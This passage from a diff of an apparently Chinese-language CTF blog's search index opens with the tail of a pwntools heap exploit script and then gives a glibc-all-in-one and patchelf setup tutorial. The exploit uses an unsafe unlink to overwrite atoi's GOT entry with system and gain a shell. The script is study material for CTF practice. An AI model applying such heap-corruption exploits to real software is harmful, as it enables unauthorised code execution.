ELF(<span class="string">&#x27;./libc/libc-2.23.so&#x27;</span>)</span><br><span class="line">atoi_got = elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,name</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;name:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;name of item:&#x27;</span>,<span class="built_in">str</span>(name))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index of item:&#x27;</span>,<span class="built_in">str</span>(index))   </span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;length of item name:&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>(content)))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;name of the item:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index of item:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">target = <span class="number">0x6020c8</span></span><br><span class="line">fd = target - <span class="number">0x18</span></span><br><span class="line">bk = target - <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">&#x27;cccc&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x30</span>)</span><br><span class="line">payload += p64(fd) + p64(bk)</span><br><span class="line">payload += <span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span></span><br><span class="line">payload += p64(<span class="number">0x30</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">2</span> + p64(<span class="number">0x30</span>) + p64(atoi_got)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">show()</span><br><span class="line">atoi_addr = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = atoi_addr - libc.sym[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.success(<span class="built_in">hex</span>(system_addr))</span><br><span class="line">log.success(<span class="built_in">hex</span>(atoi_addr))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(system_addr))</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>笔记</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>glibc-all-in-one</title>
+    <url>/article/glibc-all-in-one/</url>
+    <content><![CDATA[<h1 id="记glibc-all-in-one使用"><a href="#记glibc-all-in-one使用" class="headerlink" title="记glibc-all-in-one使用"></a>记glibc-all-in-one使用</h1><span id="more"></span>
+
+<p><a href="https://mp.weixin.qq.com/s/UAQswvnasJ0a40ibSy4ppg">参考</a></p>
+<h1 id="glibc-all-in-one"><a href="#glibc-all-in-one" class="headerlink" title="glibc-all-in-one"></a>glibc-all-in-one</h1><h2 id="glibc-all-in-one下载"><a href="#glibc-all-in-one下载" class="headerlink" title="glibc-all-in-one下载"></a>glibc-all-in-one下载</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo git <span class="built_in">clone</span> https://github.com/matrix1001/glibc-all-in-one.git</span><br><span class="line"><span class="built_in">cd</span> glibc-all-in-one/</span><br></pre></td></tr></table></figure>
+
+<h2 id="glibc-all-in-one安装"><a href="#glibc-all-in-one安装" class="headerlink" title="glibc-all-in-one安装"></a>glibc-all-in-one安装</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo python3 update_list</span><br><span class="line">[+] Common list has been save to <span class="string">&quot;list&quot;</span></span><br><span class="line">[+] Old-release list has been save to <span class="string">&quot;old_list&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="下载glibc"><a href="#下载glibc" class="headerlink" title="下载glibc"></a>下载glibc</h2><h3 id="list"><a href="#list" class="headerlink" title="list"></a>list</h3><p><img src="/article/glibc-all-in-one/image-20211012172502704.png" alt="image-20211012172502704"></p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo ./download 2.31-0ubuntu9_amd64</span><br></pre></td></tr></table></figure>
+
+<h3 id="old-list"><a href="#old-list" class="headerlink" title="old_list"></a>old_list</h3><p>和上面差不多</p>
+<p><img src="/article/glibc-all-in-one/image-20211012172551035.png" alt="image-20211012172551035"></p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">sudo ./download_old 2.23-0ubuntu11.3_amd64</span><br></pre></td></tr></table></figure>
+
+<h1 id="patchelf"><a href="#patchelf" class="headerlink" title="patchelf"></a>patchelf</h1><h2 id="patchelf下载"><a href="#patchelf下载" class="headerlink" title="patchelf下载"></a>patchelf下载</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/NixOS/patchelf.git</span><br><span class="line"><span class="built_in">cd</span> patchelf</span><br></pre></td></tr></table></figure>
+
+<h2 id="patchelf安装"><a href="#patchelf安装" class="headerlink" title="patchelf安装"></a>patchelf安装</h2><p>这里我的ubuntu16没有报错，挺顺利</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">./bootstrap.sh //如果报错 ./bootstrap.sh: 2: autoreconf: not found                 </span><br><span class="line">				//执行这个   sudo apt-get install autoconf automake libtool</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make check</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>
+
+<h1 id="实际应用"><a href="#实际应用" class="headerlink" title="实际应用"></a>实际应用</h1><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">~/glibc-all-in-one$ sudo ./download 2.27-3ubuntu1_amd64</span><br></pre></td></tr></table></figure>
+
+<p>打开隐藏文件</p>
+<p><code>Ctrl + h</code></p>
+<p>可以先在这个目录下 <code>pwd</code>一下</p>
+<p><img src="/article/glibc-all-in-one/image-20211012180509161.png" alt="image-20211012180509161"></p>
+<p><img src="/article/glibc-all-in-one/image-20211012180244757.png" alt="image-20211012180244757"></p>
+<p>解压下载的<code>deb</code>包到<code>.debug</code>中</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">~/glibc-all-in-one/debs$ sudo dpkg -X [libc6_2.27-3ubuntu1_amd64.deb] /home/trick/glibc-all-in-one/libs/[2.27-3ubuntu1_amd64]/.debug</span><br><span class="line"><span class="comment"># 修改[ ]中的内容</span></span><br></pre></td></tr></table></figure>
+
+<p>然后利用patchelf工具修改elf程序所需的动态链接库</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">patchelf --set-interpreter /home/trick/glibc-all-in-one/libs/[2.27-3ubuntu1_amd64]/[ld-2.27.so] ./ciscn_final_3</span><br><span class="line">patchelf --replace-needed libc.so.6 /home/trick/glibc-all-in-one/libs/[2.27-3ubuntu1_amd64]/[libc-2.27.so] ./ciscn_final_3</span><br><span class="line"><span class="comment"># 修改[ ]中的内容</span></span><br><span class="line">patchelf --set-interpreter /home/trick/tools/glibc-all-in-one/libs/[2.27-3ubuntu1_amd64]/[ld-2.27.so] ./ciscn_final_3</span><br><span class="line">patchelf --replace-needed libc.so.6 /home/trick/tools/glibc-all-in-one/libs/[2.27-3ubuntu1_amd64]/[libc-2.27.so] ./ciscn_final_3</span><br></pre></td></tr></table></figure>
+
+<p>glibc2.34</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">patchelf --set-interpreter /home/trick/tools/glibc-2.34/glibc-2.34/64/lib/ld-linux-x86-64.so.2 ./pwn</span><br><span class="line">patchelf --replace-needed libc.so.6 /home/trick/tools/glibc-2.34/glibc-2.34/64/lib/libc.so.6 ./pwn</span><br><span class="line"></span><br><span class="line">patchelf --set-interpreter ./ld.so ./pwn</span><br><span class="line">patchelf --replace-needed libc.so.6 ./libc.so.6 ./pwn</span><br></pre></td></tr></table></figure>
+
+
+
+
 
 ]]></content>
       <categories>
